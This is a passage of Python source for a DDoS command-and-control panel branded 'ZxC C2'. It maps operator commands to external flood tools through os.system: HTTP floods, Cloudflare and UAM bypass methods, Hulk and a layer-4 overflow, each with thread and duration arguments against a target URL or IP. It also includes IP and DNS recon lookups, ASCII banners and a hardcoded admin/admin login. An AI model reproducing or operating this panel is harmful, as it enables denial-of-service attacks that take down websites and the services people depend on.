                time = cnc.split()[2]
                os.system(f'node HTTP-REQUESTS {url} {time}')
            except IndexError:
                print('Usage: http-requests <url> <time>')
                print('Example: http-requests http://example.org 60')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('Usage: http-rand <url> <time>')
                print('Example: http-rand http://vailon.com/ 60')

        elif "overflow" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./OVERFLOW {ip} {port} {thread}')
            except IndexError:
                print('Usage: overflow <ip> <port> <threads>')
                print('Example: overflow 1.1.1.1 80 5000')

        elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node cf.js {url} {time} {thread}')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: cf-bypass http://example.com 60 1250')

        elif "uambypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                per = cnc.split()[3]
                os.system(f'node uambypass.js {url} {time} {per} http.txt')
            except IndexError:
                print('Usage: uambypass <url> <time> <req_per_ip>')
                print('Example: uambypass http://example.com 60 1250')

        elif "crash" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('Usage: crash <url> METHODS<GET/POST>')
                print('Example: crash http://example.com GET')

        elif "httpflood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('Example: httpflood http://example.com 15000 get 60')

        elif "httpget" in cnc:
            try:
                url = cnc.split()[1]
                os.system(f'./httpget {url} 10000 50 100')
            except IndexError:
                print('Usage: httpget <url>')
                print('Example: httpget http://example.com')

# BANNERS

        elif "troll" in cnc:
                print('░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░   ')
                print('░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░  ')
                print('░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░  ')
                print('░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░  ')
                print('░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░  ')
                print('█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█  ')
                print('█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█  ')
                print('░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░  ')
                print('░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░  ')
                print('░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░  ')
                print('░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░  ')
                print('░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░  ')
                print('░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░  ')
                print('░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░  ')
                print('░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░  ')

        elif "pikachu" in cnc:
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠁⠀⠹⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠿⠃⠀⠀⠐⠚⠻⢷⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢁⣀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⢠⣾⠟⠁⠀⠀⠙⢿⣦⣄⠀⠀⠀⠀⣼⠏⣼⣧⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⣴⡿⠃⠀⠀⠀⠀⠀⠀⠉⠻⣷⣤⣤⡾⢿⠐⣿⡿⠃⠀⠀⠀⢀⡖⠒⣦⡀⠀⠀⠀⠀⠈⠙⠛⠷⣦⣄⡀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡿⠁⢸⠀⠀⣤⡄⠀⠀⠀⢸⣧⣤⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣄⠀⠀⠀  ')
                print('⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⡠⠃⠀⣀⡈⠀⠀⠀⠀⠘⢿⣿⣿⠟⠀⠀⠀⠀⠠⣄⠀⠀⠀⠀⠀⠈⢻⣷⣄⠀  ')
                print('⠀⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢹⡟⠓⣶⠀⠀⠀⠀⣨⣤⣤⡀⠀⠀⠀⠀⢸⣿⣶⣦⣤⣶⣾⣿⣿⣿⣆  ')
                print('⢠⣿⣷⣶⣶⣶⣶⣤⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠘⣧⠀⠀⠈⣄⠀⡏⠀⠀⠀⢸⣿⣿⣿⣿⠀⠀⠀⠀⣸⡟⠀⠉⠙⠛⠛⠿⠿⠿⠛  ')
                print('⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⣹⣿⠟⠋⠀⠀⣠⣴⡿⠿⣷⣄⠀⠈⠓⠁⠀⠀⠀⠈⠿⣿⡿⠏⠀⠀⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡟⠁⠀⠀⠀⢾⣿⣯⡀⠀⢸⡏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠒⠛⠛⠿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠿⢿⣶⣦⣤⣀⠈⠙⢿⣶⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⡿⠃⣠⣿⢋⣽⣷⠀⠀⠀⠀⠉⠳⢦⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣷⣶⣿⣧⣾⣿⣿⡆⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠈⠻⢦⣤⣤⣴⡟⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⣿⠋⠉⠛⠃⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣧⡀⠀⠀⠀⠈⠳⣤⡀⠀⠀⠀⢀⡗⠀⠀⠀⠀⠀⠀⠀⠈⣿⡆⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⣿⣿⣿⣷⡄⠀⠀⠀⠀⠈⠙⠓⠶⠶⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠛⠋⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣇⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⡀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣤⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⣀⣠⣤⣾⠁⠀⠀⠀⣸⣿⡀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣉⣀⣀⣀⣤⣾⣿⣷⣶⣶⣶⣿⡿⠿⠿⠛⠛⠿⣷⣤⣄⡈⠀⠉⣿⡆⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠁⠀⠀⠀⠀  ')

                
# TOOLS
        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')                

        elif "cloudflare-lag" in cnc:
            print('Method "CLOUDFLARE-LAG" not enabled')

        elif "help" in cnc:
            print(f'''
LAYER7  ► SHOW LAYER7 METHODS
LAYER4  ► SHOW LAYER4 METHODS
AMP     ► SHOW AMP METHODS
SPECIAL ► SHOW SPECIAL METHODS
BANNERS ► SHOW BANNERS
RULES   ► RULES PANEL
PORTS   ► SHOW ALL PORTS
TOOLS   ► SHOW TOOLS
CLEAR   ► CLEAR TERMINAL
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = "admin"
    passwd = "admin"
    username = input("⚡ Username: ")
    password = getpass.getpass(prompt='⚡ Password: ')
    if username != user or password != passwd:
        print("")
        print("⚡ Haizzz, you're so cute...")
        sys.exit(1)
    elif username == user and password == passwd:
        print("⚡ Welcome to ZxC C2!")
        time.sleep(0.3)
        ascii_vro()
        main()

login()
